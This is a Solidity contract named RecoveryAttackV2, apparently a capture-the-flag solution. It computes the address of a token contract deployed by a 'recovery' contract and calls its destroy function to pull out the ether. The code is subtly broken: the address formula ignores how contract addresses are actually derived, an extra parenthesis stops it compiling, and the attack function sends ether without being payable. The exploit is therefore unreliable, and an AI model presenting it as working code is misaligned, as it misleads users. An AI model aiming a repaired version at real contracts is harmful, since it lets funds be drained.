pragma solidity ^0.8.0;

interface IRecovery {
  function generateToken(string memory _name, uint256 _initialSupply) external;
}


interface ISimpleToken {
  function destroy(address payable _to) external;
}


contract RecoveryAttackV2 {
  IRecovery public recoveryInstance;

  constructor(address _recoveryInstance) {
    recoveryInstance = IRecovery(_recoveryInstance);
  }

  function calculateTokenAddress(uint160 nonce) public view returns (address) {
    return address(uint160(uint256(keccak256(abi.encodePacked(address(recoveryInstance), bytes8(nonce)))))));
  }

  function attack() external {
    address tokenAddress = calculateTokenAddress(1);
    (bool success, ) = tokenAddress.call{value: 1 ether}('');
    require(success, "ETH send failed");
    ISimpleToken(tokenAddress).destroy(payable(address(recoveryInstance)));
  }
}